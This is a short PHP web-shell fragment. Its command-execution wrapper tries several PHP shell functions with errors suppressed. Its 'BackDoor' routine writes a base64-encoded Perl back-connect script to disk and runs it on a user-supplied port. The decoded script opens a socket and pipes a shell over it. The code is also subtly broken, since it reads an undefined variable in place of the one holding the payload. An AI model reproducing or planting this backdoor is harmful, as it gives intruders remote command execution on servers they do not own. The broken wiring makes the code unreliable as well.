<?php
function execmd($cmd)
{
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    foreach($funcs as $safe)
    {        
        if($safe=="exec")
        {
            $ret=@exec($cmd);
            $ret=join("\n",$ret);
        }
        elseif($safe=="system")
            $ret=@system($cmd);
        elseif($safe=="passthru")
            $ret=@passthru($cmd);            
        elseif($safe=="shell_exec")
            $ret=@shell_exec($cmd);       
    }
    return $ret;
}

function BackDoor()
{
    global $backdoor_perl;

    if(!isset($_POST['backdoor_host']))
    {
        echo "<center><form action='$self?act=bh' method='post'>
        Port: <input type='text' name='port'>
        <input type='submit' name='backdoor_host' value='Backdoor'></center>";
    } else {
        @$fh=fopen("shbd.pl","w");
        @fwrite($fh,base64_decode($backdoor_perl));
        @fclose($fh);
        execmd("perl shbd.pl $_POST[port]");
        echo "Server backdoor'd</br>";
    }
}

echo "start";
$backconnect_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K";
BackDoor();

?>